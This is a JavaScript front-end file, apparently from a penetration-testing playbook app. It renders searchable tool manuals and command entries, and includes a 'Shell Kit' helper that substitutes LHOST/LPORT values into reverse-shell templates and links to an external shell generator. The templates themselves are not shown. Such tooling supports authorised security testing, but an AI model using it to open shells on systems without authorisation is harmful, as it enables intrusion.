    if (fuzzyStrictMatches.length > 0) {
        return {
            items: fuzzyStrictMatches,
            broad: false,
            fuzzy: true
        };
    }

    return {
        items: manuals
            .map(toolManual => {
                const score = scoreToolMatch(toolManual, normalizedQuery, tokens, false, true);
                if (score < 0) {
                    return null;
                }
                return {
                    ...toolManual,
                    _score: score
                };
            })
            .filter(Boolean)
            .sort((a, b) => {
                if (b._score !== a._score) {
                    return b._score - a._score;
                }
                return a.name.localeCompare(b.name);
            }),
        broad: true,
        fuzzy: true
    };
}

function sortItemsForView(items, options = {}) {
    const { query = "" } = options;

    return [...items].sort((a, b) => {
        if (query) {
            if (b._score !== a._score) {
                return b._score - a._score;
            }
        } else {
            const pathCompare = getPathRank(a.path) - getPathRank(b.path);
            if (pathCompare !== 0) {
                return pathCompare;
            }

            const moduleCompare = getModuleRank(a.module) - getModuleRank(b.module);
            if (moduleCompare !== 0) {
                return moduleCompare;
            }

            const toolCompare = a.tool.localeCompare(b.tool);
            if (toolCompare !== 0) {
                return toolCompare;
            }
        }

        return a.title.localeCompare(b.title);
    });
}

function getTopFlags(items, limit = 5) {
    const flagCounts = new Map();

    items.forEach(item => {
        (item.flags || []).forEach(flag => {
            flagCounts.set(flag, (flagCounts.get(flag) || 0) + 1);
        });
    });

    return Array.from(flagCounts.entries())
        .sort((a, b) => {
            if (b[1] !== a[1]) {
                return b[1] - a[1];
            }
            return a[0].localeCompare(b[0]);
        })
        .slice(0, limit)
        .map(([flag]) => flag);
}

function getPlatforms(items) {
    return Array.from(new Set(items.map(item => item.platform).filter(Boolean)));
}

function getToolUseCases(items, limit = 3) {
    return Array.from(new Set(items.map(item => item.title).filter(Boolean))).slice(0, limit);
}

function buildToolSummary(toolName, items) {
    if (items.length === 0) {
        return `${toolName} quick guide.`;
    }

    if (items.length === 1) {
        return items[0].description || `${toolName} quick guide.`;
    }

    const useCases = getToolUseCases(items, 3);
    if (useCases.length === 0) {
        return items[0].description || `${toolName} quick guide.`;
    }

    return `Saved workflows: ${useCases.join(" • ")}`;
}

function encodeInlineValue(value) {
    return encodeURIComponent(String(value || ""));
}

function buildDisplayGroups(items) {
    const pathMap = new Map();

    items.forEach(item => {
        if (!pathMap.has(item.path)) {
            pathMap.set(item.path, {
                name: item.path,
                items: [],
                modules: new Map()
            });
        }

        const pathGroup = pathMap.get(item.path);
        pathGroup.items.push(item);

        if (!pathGroup.modules.has(item.module)) {
            pathGroup.modules.set(item.module, {
                name: item.module,
                path: item.path,
                items: [],
                tools: new Map()
            });
        }

        const moduleGroup = pathGroup.modules.get(item.module);
        moduleGroup.items.push(item);

        if (!moduleGroup.tools.has(item.tool)) {
            moduleGroup.tools.set(item.tool, {
                name: item.tool,
                items: []
            });
        }

        moduleGroup.tools.get(item.tool).items.push(item);
    });

    return getOrderedPaths(Array.from(pathMap.keys())).map(pathName => {
        const pathGroup = pathMap.get(pathName);
        const moduleNames = Array.from(pathGroup.modules.keys());

        return {
            name: pathName,
            items: pathGroup.items,
            meta: getPathMeta(pathName),
            modules: getOrderedModules(pathName, moduleNames).map(moduleName => {
                const moduleGroup = pathGroup.modules.get(moduleName);
                const toolGroups = Array.from(moduleGroup.tools.values())
                    .sort((a, b) => a.name.localeCompare(b.name))
                    .map(toolGroup => ({
                        ...toolGroup,
                        items: sortItemsForView(toolGroup.items, { query: activeView.query }),
                        platforms: getPlatforms(toolGroup.items),
                        topFlags: getTopFlags(toolGroup.items, 4),
                        profile: getToolProfile(toolGroup.name)
                    }));

                return {
                    ...moduleGroup,
                    tools: toolGroups,
                    meta: getModuleMeta(moduleName)
                };
            })
        };
    });
}

function getShellHelperValues() {
    const hostInput = document.getElementById("shell-helper-host");
    const portInput = document.getElementById("shell-helper-port");

    return {
        host: hostInput?.value.trim() || shellHelperDefaults.host,
        port: portInput?.value.trim() || shellHelperDefaults.port
    };
}

function renderShellHelperTemplate(template) {
    const { host, port } = getShellHelperValues();

    return String(template)
        .replaceAll("{{HOST}}", host)
        .replaceAll("{{PORT}}", port);
}

function setCopyButtonState(button, label, isCopied = false) {
    if (!button) {
        return;
    }

    const defaultLabel = button.dataset.copyLabel || button.innerText.trim() || "Copy";
    button.dataset.copyLabel = defaultLabel;

    if (button._copyResetTimer) {
        window.clearTimeout(button._copyResetTimer);
    }

    button.innerText = label;
    button.classList.toggle("is-copied", isCopied);
    button.classList.toggle("is-failed", !isCopied);

    button._copyResetTimer = window.setTimeout(() => {
        button.innerText = defaultLabel;
        button.classList.remove("is-copied", "is-failed");
    }, 1200);
}

async function writeTextToClipboard(text) {
    const value = String(text || "");

    if (!value) {
        return false;
    }

    if (navigator.clipboard?.writeText && window.isSecureContext) {
        try {
            await navigator.clipboard.writeText(value);
            return true;
        } catch (error) {
            // Fall through to the textarea copy path when the modern API is blocked.
        }
    }

    const textArea = document.createElement("textarea");
    textArea.value = value;
    textArea.setAttribute("readonly", "");
    textArea.style.position = "fixed";
    textArea.style.top = "0";
    textArea.style.left = "-9999px";
    textArea.style.opacity = "0";
    textArea.style.pointerEvents = "none";

    const previousActiveElement = document.activeElement;
    const selection = document.getSelection();
    const previousRange = selection && selection.rangeCount > 0
        ? selection.getRangeAt(0)
        : null;

    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    textArea.setSelectionRange(0, textArea.value.length);

    let copied = false;

    try {
        copied = document.execCommand("copy");
    } catch (error) {
        copied = false;
    }

    document.body.removeChild(textArea);

    if (selection) {
        selection.removeAllRanges();
        if (previousRange) {
            selection.addRange(previousRange);
        }
    }

    if (previousActiveElement instanceof HTMLElement) {
        previousActiveElement.focus();
    }

    return copied;
}

async function copyInlineText(text, button) {
    const didCopy = await writeTextToClipboard(text);
    setCopyButtonState(button, didCopy ? "Copied" : "Failed", didCopy);
}

function getShellHelperCard(sectionIndex, cardIndex) {
    return shellHelperSections[sectionIndex]?.cards?.[cardIndex] || null;
}

function copyShellHelperCommand(sectionIndex, cardIndex, button) {
    const card = getShellHelperCard(sectionIndex, cardIndex);
    if (!card) {
        return;
    }

    copyInlineText(renderShellHelperTemplate(card.template), button);
}

function updateShellHelper() {
    shellHelperSections.forEach((section, sectionIndex) => {
        section.cards.forEach((card, cardIndex) => {
            const codeNode = document.getElementById(`shell-helper-code-${sectionIndex}-${cardIndex}`);
            if (codeNode) {
                codeNode.textContent = renderShellHelperTemplate(card.template);
            }
        });
    });
}

function buildShellHelperMarkup() {
    const fileTransferPath = encodeInlineValue("Post-Exploitation & Escalation");
    const fileTransferModule = encodeInlineValue("File Transfer & Tool Staging");

    return `
        <section class="shell-helper">
            <div class="shell-helper-head">
                <div class="shell-helper-copy">
                    <span class="section-kicker">Shell Kit</span>
                    <h3 class="shell-helper-title">Listener, callback, and TTY helper</h3>
                    <p class="section-subcopy">Keep a compact shell workflow on-page here, then jump to the wider external generator only when you need more callback coverage.</p>
                </div>
                <div class="tool-actions">
                    <a class="doc-link doc-pill" href="https://www.revshells.com/" target="_blank" rel="noreferrer">Open revshells.com</a>
                </div>
            </div>
            <div class="shell-helper-controls">
                <label class="shell-helper-field">
                    <span class="manual-inline-label">LHOST</span>
                    <input
                        id="shell-helper-host"
                        class="shell-helper-input"
                        type="text"
                        value="${escapeHtml(shellHelperDefaults.host)}"
                        placeholder="${escapeHtml(shellHelperDefaults.host)}"
                        oninput="updateShellHelper()"
                    >
                </label>
                <label class="shell-helper-field">
                    <span class="manual-inline-label">LPORT</span>
                    <input
                        id="shell-helper-port"
                        class="shell-helper-input"
                        type="text"
                        inputmode="numeric"
                        value="${escapeHtml(shellHelperDefaults.port)}"
                        placeholder="${escapeHtml(shellHelperDefaults.port)}"
                        oninput="updateShellHelper()"
                    >
                </label>
            </div>
            <div class="shell-helper-stack">
                ${shellHelperSections.map((section, sectionIndex) => `
                    <section class="shell-helper-section">
                        <div class="shell-helper-section-head">
                            <div>
                                <span class="section-kicker">${escapeHtml(section.kicker)}</span>
                                <h4 class="shell-helper-section-title">${escapeHtml(section.title)}</h4>
                                <p class="section-subcopy">${escapeHtml(section.description)}</p>
                            </div>
                        </div>
                        <div class="shell-helper-grid">
                            ${section.cards.map((card, cardIndex) => `
                                <article class="shell-helper-card">
                                    <div class="shell-helper-card-head">
                                        <span class="entry-kind-badge">${escapeHtml(card.label)}</span>
                                        <h4 class="shell-helper-card-title">${escapeHtml(card.title)}</h4>
                                    </div>
                                    <p class="command-description">${escapeHtml(card.description)}</p>
                                    ${buildCodeShellMarkup(
                                        `<code id="shell-helper-code-${sectionIndex}-${cardIndex}">${escapeHtml(renderShellHelperTemplate(card.template))}</code>`,
                                        `onclick="copyShellHelperCommand(${sectionIndex}, ${cardIndex}, this)"`,
                                        "Template"
                                    )}
                                </article>
                            `).join("")}
                        </div>
                    </section>
                `).join("")}
            </div>
            <div class="shell-helper-support">
                <article class="shell-helper-panel">
                    <span class="section-kicker">Session Flow</span>
                    <h4 class="shell-helper-section-title">Keep the session usable</h4>
                    <ul class="shell-helper-list">
                        ${shellHelperChecklist.map(item => `<li>${escapeHtml(item)}</li>`).join("")}
                    </ul>
                </article>
                <article class="shell-helper-panel">
                    <span class="section-kicker">Need More</span>
                    <h4 class="shell-helper-section-title">Wider reference coverage</h4>
                    <p class="section-subcopy">Use the external generator for broader callback combinations, and jump to the staging workflow when you need delivery and transfer helpers.</p>
                    <div class="shell-helper-actions">
                        <a class="doc-link doc-pill" href="https://www.revshells.com/" target="_blank" rel="noreferrer">External shell generator</a>
                        <button
                            class="secondary-btn inline-btn"
                            type="button"
                            onclick="loadView(decodeURIComponent('${fileTransferPath}'), decodeURIComponent('${fileTransferModule}'), null, '', { historyMode: 'push' })"
                        >
                            Open file transfer workflow
                        </button>
                    </div>
                </article>
            </div>
        </section>
    `;
}

function buildModuleFeatureMarkup(moduleGroup) {
    if (moduleGroup.name === "Shells & Payload Delivery" && activeView.type !== "tool") {
        return buildShellHelperMarkup();
    }

    return "";
}

function buildModuleToolMarkup(meta = {}) {
    return (meta.tools || [])
        .slice(0, 6)
        .map(tool => `<span class="module-tool-chip">${escapeHtml(tool)}</span>`)
        .join("");
}

function buildCodeShellMarkup(codeMarkup, copyHandler, label = "Command") {
    return `
        <div class="code-shell">
            <div class="code-shell-head">
                <span class="code-shell-label">${escapeHtml(label)}</span>
                <button class="copy-btn" type="button" ${copyHandler}>Copy</button>
            </div>
            <pre class="command-code">${codeMarkup}</pre>
        </div>
    `;
}

function buildWorkflowMarkup(text) {
    const value = String(text || "").trim();
    if (!value) {
        return "";
    }

    const steps = value
        .split(/\s*->\s*/)
        .map(step => step.trim())
        .filter(Boolean);

    if (steps.length > 1) {
        return `
            <div class="workflow-panel">
                <div class="workflow-panel-head">
                    <span class="workflow-label">Workflow Path</span>
                    <span class="workflow-chip">${pluralize(steps.length, "step")}</span>
                </div>
                <ol class="workflow-steps">
                    ${steps.map((step, index) => `
                        <li class="workflow-step">
                            <span class="workflow-step-index">${index + 1}</span>
                            <span class="workflow-step-copy">${escapeHtml(step)}</span>
                        </li>
                    `).join("")}
                </ol>
            </div>
        `;
    }

    return `
        <div class="workflow-panel">
            <div class="workflow-panel-head">
                <span class="workflow-label">Workflow Note</span>
            </div>
            <p class="workflow-note">${escapeHtml(value)}</p>
        </div>
    `;
}

function buildCommandMarkup(item, isOpen) {
    const tagsMarkup = buildTagMarkup(item.tags || [], 7);
    const hasTags = Boolean(tagsMarkup);
    const hasTip = Boolean(item.tip);
    const hasDescription = Boolean(item.description);
    const hasCommandText = Boolean(String(item.command || "").trim());
    const isWorkflow = isWorkflowEntry(item);
    const hasPreview = hasCopyableCommand(item);
    const hasWorkflowMarkup = hasCommandText && isWorkflow;
    const hasPlatform = Boolean(item.platform);
    const flagsMarkup = (item.flags || []).length > 0
        ? `<div class="flags-row">${item.flags.map(flag => `<span class="flag-chip">${escapeHtml(flag)}</span>`).join("")}</div>`
        : "";
    const bestMatchMarkup = activeView.query && activeView.focusedId === item.entryId
        ? `<span class="match-badge">Best match</span>`
        : "";
    const docMarkup = item.reference_url
        ? `<a class="doc-link doc-pill" href="${escapeHtml(item.reference_url)}" target="_blank" rel="noreferrer">${escapeHtml(item.reference_label || "Docs")}</a>`
        : "";
    const hasNotes = Boolean(item.help_menu || item.tip || hasTags || flagsMarkup || item.reference_url);
    const actionMarkup = `
        ${hasNotes ? `<button class="secondary-btn inline-btn" type="button" onclick="openEntryNotes('${item.entryId}')">Notes</button>` : ""}
        ${docMarkup}
    `.trim();
    const hasActions = Boolean(actionMarkup);
    const toplineMarkup = hasTags || hasActions
        ? `
            <div class="command-topline">
                ${hasTags ? `<div class="tag-row">${tagsMarkup}</div>` : ""}
                ${hasActions ? `<div class="command-actions">${actionMarkup}</div>` : ""}
            </div>
        `
        : "";

    return `
        <details class="command-item"${isOpen ? " open" : ""}>
            <summary>
                <div class="command-main">
                    <div class="command-title-row">
                        <span class="entry-kind-badge">${escapeHtml(item.type || "Entry")}</span>
                        <span class="command-title">${escapeHtml(item.title)}</span>
                        ${bestMatchMarkup}
                    </div>
                    ${hasDescription ? `<p class="command-description">${escapeHtml(item.description)}</p>` : ""}
                    ${hasPreview ? `<code class="command-preview">${buildPreviewText(item.command)}</code>` : ""}
                </div>
                <div class="command-meta">
                    ${hasPlatform ? `<span class="platform-badge">${escapeHtml(item.platform)}</span>` : ""}
                    <span class="command-chevron material-symbols-outlined">expand_more</span>
                </div>
            </summary>
            <div class="command-body">
                ${toplineMarkup}
                ${flagsMarkup}
                ${hasPreview ? `
                    ${buildCodeShellMarkup(
                        `<code>${escapeHtml(item.command)}</code>`,
                        `onclick="copyCommandById('${item.entryId}', this)"`,
                        item.type === "Payload" ? "Payload" : "Command"
                    )}
                ` : ""}
                ${hasWorkflowMarkup ? buildWorkflowMarkup(item.command) : ""}
                ${hasTip ? `<p class="command-tip">${escapeHtml(item.tip)}</p>` : ""}
            </div>
        </details>
    `;
}

function buildInstallButtonMarkup(toolName, installation = null) {
    if (!installation) {
        return "";
    }

    return `
        <button
            class="secondary-btn inline-btn install-pill"
            type="button"
            onclick="openInstallModal(decodeURIComponent('${encodeInlineValue(toolName)}'))"
        >
            Install steps
        </button>
    `;
}

function buildToolClusterMarkup(toolGroup, moduleGroup, pathGroup, toolIndex) {
    const manual = getToolManual(toolGroup.name);
    const platformMarkup = toolGroup.platforms
        .map(platform => `<span class="platform-badge">${escapeHtml(platform)}</span>`)
        .join("");
    const referenceMarkup = (manual.reference_items || []).length > 0
        ? manual.reference_items.slice(0, 4).map(item => `<span class="flag-chip">${escapeHtml(item.name)}</span>`).join("")
        : "";
    const guideToken = encodeInlineValue(toolGroup.name);
    const manualMarkup = manual.manual_url
        ? `
            <a
                class="doc-link doc-pill"
                href="${escapeHtml(manual.manual_url)}"
                target="_blank"
                rel="noreferrer"
            >
                Manual
            </a>
        `
        : "";
    const installMarkup = buildInstallButtonMarkup(toolGroup.name, manual.installation);
    const hasAssistantCard = Boolean(manual.summary || manual.syntax || referenceMarkup || manualMarkup || installMarkup);
    const isToolOpen = hasActiveToolPanel()
        ? isActiveToolLocation(pathGroup.name, moduleGroup.name, toolGroup.name)
        : activeView.query
            ? toolGroup.items.some(item => item.entryId === activeView.focusedId)
            : false;

    const commandsMarkup = toolGroup.items
        .map((item, itemIndex) => {
            const isOpen = activeView.focusedId === item.entryId
                || (isActiveToolLocation(pathGroup.name, moduleGroup.name, toolGroup.name) && itemIndex === 0);
            return buildCommandMarkup(item, isOpen);
        })
        .join("");

    return `
        <details class="tool-cluster"${isToolOpen ? " open" : ""}>
            <summary class="tool-cluster-head">
                <div class="tool-cluster-main">
                    <div class="tool-cluster-topline">
                        <span class="tool-pill">${escapeHtml(toolGroup.name)}</span>
                        <span class="cluster-count">${pluralize(toolGroup.items.length, "entry")}</span>
                        ${platformMarkup}
                    </div>
                </div>
                <div class="tool-cluster-tail">
                    <span class="tool-chevron material-symbols-outlined">expand_more</span>
                </div>
            </summary>
            <div class="tool-cluster-body">
                ${hasAssistantCard ? `
                    <div class="tool-assistant-card">
                        ${manual.summary ? `<p class="tool-summary">${escapeHtml(manual.summary || buildToolSummary(toolGroup.name, toolGroup.items))}</p>` : ""}
                        ${manual.syntax ? `<code class="tool-syntax">${buildPreviewText(manual.syntax)}</code>` : ""}
                        ${(referenceMarkup || manualMarkup) ? `
                            <div class="tool-assistant-row">
                                ${referenceMarkup ? `<div class="tool-flags">${referenceMarkup}</div>` : ""}
                                <div class="tool-actions">
                                    <button
                                        class="secondary-btn inline-btn"
                                        type="button"
                                        onclick="loadToolView(decodeURIComponent('${guideToken}'))"
                                    >
                                        Open manual
                                    </button>
                                    ${manualMarkup}
                                    ${installMarkup}
                                </div>
                            </div>
                        ` : `
                            <div class="tool-actions">
                                <button
                                    class="secondary-btn inline-btn"
                                    type="button"
                                    onclick="loadToolView(decodeURIComponent('${guideToken}'))"
                                >
                                    Open manual
                                </button>
                                ${installMarkup}
                            </div>
                        `}
                    </div>
                ` : ""}
                <div class="command-list">
                    ${commandsMarkup}
                </div>
            </div>
        </details>
    `;
}

function buildModuleSectionMarkup(moduleGroup, pathGroup, moduleIndex) {
    const meta = moduleGroup.meta || {};
    const isModuleOpen = activeView.module
        ? activeView.module === moduleGroup.name
        : activeView.query
            ? moduleGroup.items.some(item => item.entryId === activeView.focusedId)
            : moduleIndex === 0;

    const toolsMarkup = moduleGroup.tools
        .map((toolGroup, toolIndex) => buildToolClusterMarkup(toolGroup, moduleGroup, pathGroup, toolIndex))
        .join("");

    return `
        <details class="module-section"${isModuleOpen ? " open" : ""}>
            <summary class="module-summary">
                <div class="module-copy">
                    <span class="module-kicker">Workflow</span>
                    <h2 class="module-title">${escapeHtml(moduleGroup.name)}</h2>
                    <p class="module-description">${escapeHtml(meta.summary || "Compact workflow notes and snippets.")}</p>
                </div>
                <div class="module-summary-tail">
                    <span class="section-chip">${pluralize(moduleGroup.items.length, "entry")}</span>
                    <span class="module-chevron material-symbols-outlined">expand_more</span>
                </div>
            </summary>
            <div class="module-body">
                ${(meta.tools || []).length > 0 ? `<div class="module-tools-row">${buildModuleToolMarkup(meta)}</div>` : ""}
                ${buildModuleFeatureMarkup(moduleGroup)}
                <div class="result-tools">
                    ${toolsMarkup}
                </div>
            </div>
        </details>
    `;
}

function buildPathSectionMarkup(pathGroup) {
    const pathSummary = activeView.query
        ? `${pluralize(pathGroup.items.length, "match")} across ${pluralize(pathGroup.modules.length, "workflow")}.`
        : `${pluralize(pathGroup.modules.length, "workflow")} in this stage.`;
    const modulesMarkup = pathGroup.modules
        .map((moduleGroup, moduleIndex) => buildModuleSectionMarkup(moduleGroup, pathGroup, moduleIndex))
        .join("");

    return `
        <section class="result-section">
            <header class="result-section-header">
                <div class="section-copy">
                    <span class="section-kicker">Stage</span>
                    <h2 class="section-title">${escapeHtml(pathGroup.name)}</h2>
                    <p class="section-subcopy">${escapeHtml(pathGroup.meta.summary || pathSummary)}</p>
                </div>
                <span class="section-chip">${pluralize(pathGroup.items.length, "entry")}</span>
            </header>
            <div class="module-stack">
                ${modulesMarkup}
            </div>
        </section>
    `;
}

function buildEntryResultsMarkup(items) {
    const groups = buildDisplayGroups(items);
    return groups
        .map(group => buildPathSectionMarkup(group))
        .join("");
}

function renderEntryResults(items) {
    payloadContainer.innerHTML = buildEntryResultsMarkup(items);
    updateShellHelper();
}

function buildToolSearchCardMarkup(toolManual) {
    const guideToken = encodeInlineValue(toolManual.name);

    return `
        <button
            class="tool-search-card tool-search-result"
            type="button"
            onclick="loadToolView(decodeURIComponent('${guideToken}'))"
            title="Open ${escapeHtml(toolManual.name)} manual"
        >
            <span class="tool-search-copy">
                <span class="tool-search-title-row">
                    <span class="tool-pill">${escapeHtml(toolManual.name)}</span>
                </span>
                <span class="tool-search-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</span>
            </span>
            <span class="tool-search-open material-symbols-outlined">arrow_forward</span>
        </button>
    `;
}

function buildToolSearchSectionMarkup(toolMatches) {
    return `
        <section class="result-section">
            <header class="result-section-header">
                <div class="section-copy">
                    <span class="section-kicker">Tool Matches</span>
                    <h2 class="section-title">Tool manuals</h2>
                    <p class="section-subcopy">Click a tool to open its manual.</p>
                </div>
                <span class="section-chip">${pluralize(toolMatches.length, "tool match")}</span>
            </header>
            <div class="tool-search-grid">
                ${toolMatches.map(buildToolSearchCardMarkup).join("")}
            </div>
        </section>
    `;
}

function buildManualMetaMarkup(values = [], className = "tag-chip", emptyText = "Not captured yet.") {
    if (!values || values.length === 0) {
        return `<span class="flag-empty">${escapeHtml(emptyText)}</span>`;
    }

    return values.map(value => `<span class="${className}">${escapeHtml(value)}</span>`).join("");
}

function buildManualCoverageBlock(label, values = [], className = "tag-chip") {
    if (!values || values.length === 0) {
        return "";
    }

    return `
        <div>
            <span class="manual-inline-label">${escapeHtml(label)}</span>
            <div class="tag-row">${buildManualMetaMarkup(values, className)}</div>
        </div>
    `;
}

function buildManualCardMarkup(title, body, kicker = "Manual") {
    return `
        <article class="manual-card">
            <span class="manual-card-kicker">${escapeHtml(kicker)}</span>
            <h3 class="manual-card-title">${escapeHtml(title)}</h3>
            ${body}
        </article>
    `;
}

function buildManualParametersMarkup(parameters = []) {
    if (parameters.length === 0) {
        return `<p class="manual-empty-copy">No explicit parameters are saved for this tool yet.</p>`;
    }

    return `
        <div class="manual-card-grid">
            ${parameters.map(parameter => buildManualCardMarkup(
                parameter.name,
                `<p class="manual-card-copy">${escapeHtml(parameter.description || "Saved parameter reference.")}</p>`,
                "Parameter"
            )).join("")}
        </div>
    `;
}

function buildManualReferenceMarkup(referenceItems = []) {
    if (referenceItems.length === 0) {
        return `<p class="manual-empty-copy">No flag or control notes are saved for this tool yet.</p>`;
    }

    return `
        <div class="manual-card-grid">
            ${referenceItems.map(item => buildManualCardMarkup(
                item.name,
                `
                    <p class="manual-card-copy">${escapeHtml(item.description || "Saved tool reference item.")}</p>
                    ${item.use_case ? `<p class="manual-card-meta">${escapeHtml(item.use_case)}</p>` : ""}
                `,
                item.type || "Reference"
            )).join("")}
        </div>
    `;
}

function buildManualRelatedToolsMarkup(relatedTools = []) {
    if (relatedTools.length === 0) {
        return `<p class="manual-empty-copy">No related tools suggested yet.</p>`;
    }

    return `
        <div class="tag-row">
            ${relatedTools.map(toolName => `
                <button class="secondary-btn inline-btn related-tool-btn" type="button" onclick="loadToolView(decodeURIComponent('${encodeInlineValue(toolName)}'))">
                    ${escapeHtml(toolName)}
                </button>
            `).join("")}
        </div>
    `;
}

function buildManualExamplesMarkup(items) {
    const groups = buildDisplayGroups(items);

    return groups
        .map(group => buildPathSectionMarkup(group))
        .join("");
}

function renderSearchResults(toolMatches = [], entryMatches = []) {
    payloadContainer.innerHTML = [
        toolMatches.length > 0 ? buildToolSearchSectionMarkup(toolMatches) : "",
        entryMatches.length > 0 ? buildEntryResultsMarkup(entryMatches) : ""
    ].filter(Boolean).join("");
    updateShellHelper();
}

function renderToolManualPage(toolName) {
    const toolManual = getToolManual(toolName);
    const manualMarkup = toolManual.manual_url
        ? `<a class="doc-link doc-pill" href="${escapeHtml(toolManual.manual_url)}" target="_blank" rel="noreferrer">${escapeHtml(toolManual.manual_label || "Manual")}</a>`
        : "";
    const installMarkup = buildInstallButtonMarkup(toolManual.name, toolManual.installation);
    const coverageMarkup = [
        buildManualCoverageBlock("Stages", toolManual.stages),
        buildManualCoverageBlock("Workflows", toolManual.workflows),
        buildManualCoverageBlock("Platforms", toolManual.platforms, "platform-badge")
    ].filter(Boolean).join("");
    const parametersSection = toolManual.parameters.length > 0
        ? `
            <div class="manual-section">
                <div class="manual-section-header">
                    <div>
                        <span class="section-kicker">Parameters</span>
                        <h2 class="section-title">Useful inputs</h2>
                    </div>
                </div>
                ${buildManualParametersMarkup(toolManual.parameters)}
            </div>
        `
        : "";
    const referenceSection = toolManual.reference_items.length > 0
        ? `
            <div class="manual-section">
                <div class="manual-section-header">
                    <div>
                        <span class="section-kicker">Reference</span>
                        <h2 class="section-title">Helpful parameters, flags, and controls</h2>
                    </div>
                </div>
                ${buildManualReferenceMarkup(toolManual.reference_items)}
            </div>
        `
        : "";
    const relatedSection = toolManual.related_tools.length > 0
        ? `
            <div class="manual-section">
                <div class="manual-section-header">
                    <div>
                        <span class="section-kicker">Pairings</span>
                        <h2 class="section-title">Related tools</h2>
                    </div>
                </div>
                ${buildManualRelatedToolsMarkup(toolManual.related_tools)}
            </div>
        `
        : "";
    const notesSection = (toolManual.notes || []).length > 0
        ? `
            <div class="manual-section">
                <div class="manual-section-header">
                    <div>
                        <span class="section-kicker">Operator Notes</span>
                        <h2 class="section-title">Keep in mind</h2>
                    </div>
                </div>
                <div class="manual-note-list">
                    ${toolManual.notes.map(note => `<div class="guide-item">${escapeHtml(note)}</div>`).join("")}
                </div>
            </div>
        `
        : "";
    const examplesSection = toolManual.items.length > 0
        ? `
            <section class="result-section">
                <header class="result-section-header">
                    <div class="section-copy">
                        <span class="section-kicker">Examples</span>
                        <h2 class="section-title">Saved workflows and commands</h2>
                        <p class="section-subcopy">Examples stay below the manual so the tool stays the spotlight.</p>
                    </div>
                    <span class="section-chip">${pluralize(toolManual.items.length, "example")}</span>
                </header>
                <div class="module-stack">
                    ${buildManualExamplesMarkup(toolManual.items)}
                </div>
            </section>
        `
        : "";

    detailContainer.innerHTML = `
        <section class="manual-shell">
            <div class="manual-hero">
                <div class="manual-hero-copy">
                    <span class="section-kicker">Tool Manual</span>
                    <h1 class="manual-title">${escapeHtml(toolManual.name)}</h1>
                    <p class="manual-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</p>
                    ${toolManual.syntax ? `<div class="manual-code-block"><span class="manual-inline-label">Syntax</span><code class="tool-syntax">${buildPreviewText(toolManual.syntax)}</code></div>` : ""}
                </div>
                <div class="manual-hero-actions">
                    ${manualMarkup}
                    ${installMarkup}
                </div>
            </div>
            ${coverageMarkup ? `
                <div class="manual-section">
                    <div class="manual-section-header">
                        <div>
                            <span class="section-kicker">Coverage</span>
                            <h2 class="section-title">Where this tool shows up</h2>
                        </div>
                    </div>
                    <div class="manual-chip-stack">
                        ${coverageMarkup}
                    </div>
                </div>
            ` : ""}
            ${parametersSection}
            ${referenceSection}
            ${relatedSection}
            ${notesSection}
        </section>
        ${examplesSection}
    `;
    updateWorkspaceLayout();
    updateShellHelper();
}

function syncUrlState(options = {}) {
    const { historyMode = "replace" } = options;
    if (historyMode === "none") {
        return;
    }

    const params = new URLSearchParams();

    if (activeView.type === "search" && activeView.query) {
        params.set("q", activeView.query);
    } else if (activeView.path) {
        params.set("path", activeView.path);
        if (activeView.module) {
            params.set("module", activeView.module);
        }
    }

    if (hasActiveToolPanel()) {
        params.set("tool", activeToolContext.tool);
    }

    const nextUrl = params.toString()
        ? `${window.location.pathname}?${params.toString()}`
        : window.location.pathname;
    const currentUrl = `${window.location.pathname}${window.location.search}`;

    if (nextUrl === currentUrl) {
        return;
    }

    const historyMethod = historyMode === "push" ? "pushState" : "replaceState";
    window.history[historyMethod](null, "", nextUrl);
}

function buildLoadErrorMarkup(message) {
    return `
        <div class="empty-state">
            <h3>Could not load the playbook data</h3>
            <p class="error-text">${escapeHtml(message)}</p>
            <pre>python3 -m http.server 4173</pre>
        </div>
    `;
}

function renderLoadError(error) {
    const localFileMessage = window.location.protocol === "file:"
        ? "This app loads data with fetch(), so modern browsers block it over file://. Start a local web server from the project folder, then open the app through http://127.0.0.1:4173/."
        : "The app could not read data.json. Make sure the static files are being served correctly and that data.json is present beside index.html.";
    const detail = error instanceof Error && error.message ? `${localFileMessage} (${error.message})` : localFileMessage;

    homeDashboard.style.display = "none";
    payloadContainer.innerHTML = buildLoadErrorMarkup(detail);
    setResultsMeta("Load error");
    setClearSearchState(false);
}

function fetchJsonFile(url) {
    return fetch(url).then(response => {
        if (!response.ok) {
            throw new Error(`${url} returned ${response.status}`);
        }

        return response.json();
    });
}

function showHomeBaseView(options = {}) {
    const { historyMode = "replace" } = options;

    activeView = {
        type: "home",
        path: null,
        module: null,
        tool: null,
        query: "",
        focusedId: null,
        broadSearch: false,
        fuzzySearch: false
    };
    currentViewDB = [];
    currentToolMatches = [];
    homeDashboard.style.display = "grid";
    payloadContainer.innerHTML = "";
    searchBox.value = "";
    setResultsMeta("Home dashboard");
    updateWorkspaceLayout();
    setClearSearchState();
    syncUrlState({ historyMode });
    renderSidebar();
}

function rerenderActiveView() {
    if (activeView.type === "search" && activeView.query) {
        loadView(null, null, null, activeView.query, { historyMode: "none" });
    } else if (activeView.type === "module" && activeView.path && activeView.module) {
        loadView(activeView.path, activeView.module, null, "", { historyMode: "none" });
    } else if (activeView.type === "path" && activeView.path) {
        loadView(activeView.path, null, null, "", { historyMode: "none" });
    } else {
        renderHomeDashboard();
        showHomeBaseView({ historyMode: "none" });
    }

    if (hasActiveToolPanel()) {
        loadToolView(activeToolContext.tool, activeToolContext.path, activeToolContext.module, { historyMode: "none" });
    }
}

function loadToolManualOverridesInBackground() {
    if (hasLoadedToolManualOverrides) {
        return Promise.resolve();
    }

    if (toolManualLoadPromise) {
        return toolManualLoadPromise;
    }

    toolManualLoadPromise = fetchJsonFile("tool-manuals.json")
        .then(manualData => {
            hydrateToolManualOverrides(manualData || {});
            buildToolManualIndex();
            hasLoadedToolManualOverrides = true;
            renderSidebar();
            rerenderActiveView();
        })
        .catch(() => {
            // Derived manual content still works, so manual override load failures stay non-fatal.
        })
        .finally(() => {
            toolManualLoadPromise = null;
        });

    return toolManualLoadPromise;
}

function getRouteStateFromUrl() {
    const params = new URLSearchParams(window.location.search);
    return {
        query: params.get("q")?.trim() || "",
        pathName: params.get("path")?.trim() || "",
        moduleName: params.get("module")?.trim() || "",
        toolName: params.get("tool")?.trim() || ""
    };
}

